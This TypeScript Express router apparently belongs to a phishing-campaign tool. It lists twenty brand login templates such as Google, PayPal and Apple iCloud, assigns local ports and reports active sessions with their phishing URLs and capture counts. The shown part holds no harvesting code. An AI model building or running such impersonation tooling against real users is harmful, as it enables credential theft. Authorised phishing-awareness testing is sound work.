import { Router, type IRouter } from "express";
import { db, campaignsTable } from "@workspace/db";
import { eq } from "drizzle-orm";

const router: IRouter = Router();

const TEMPLATES: Record<string, string> = {
  facebook: "Facebook",
  instagram: "Instagram",
  google: "Google",
  microsoft: "Microsoft",
  netflix: "Netflix",
  twitter: "Twitter / X",
  linkedin: "LinkedIn",
  github: "GitHub",
  dropbox: "Dropbox",
  yahoo: "Yahoo Mail",
  protonmail: "ProtonMail",
  paypal: "PayPal",
  ebay: "eBay",
  adobe: "Adobe",
  apple: "Apple iCloud",
  spotify: "Spotify",
  twitch: "Twitch",
  pinterest: "Pinterest",
  discord: "Discord",
  snapchat: "Snapchat",
};

export function getTemplateNameById(id: string): string {
  return TEMPLATES[id] ?? id;
}

let portCounter = 9000;
const usedPorts = new Set<number>();

export function getNextAvailablePort(): number {
  while (usedPorts.has(portCounter)) {
    portCounter++;
  }
  const port = portCounter++;
  usedPorts.add(port);
  return port;
}

export function releasePort(port: number): void {
  usedPorts.delete(port);
}

export const activeSessions = new Map<number, { port: number; startedAt: string; captureCount: number }>();

router.get("/sessions", async (_req, res) => {
  const sessionList = [];
  for (const [campaignId, session] of activeSessions.entries()) {
    const [campaign] = await db.select().from(campaignsTable).where(eq(campaignsTable.id, campaignId));
    if (campaign) {
      sessionList.push({
        id: campaignId,
        campaignId,
        campaignName: campaign.name,
        phishUrl: campaign.phishUrl ?? "",
        port: session.port,
        startedAt: session.startedAt,
        captureCount: campaign.captureCount,
      });
    }
  }
  res.json(sessionList);
});

export default router;
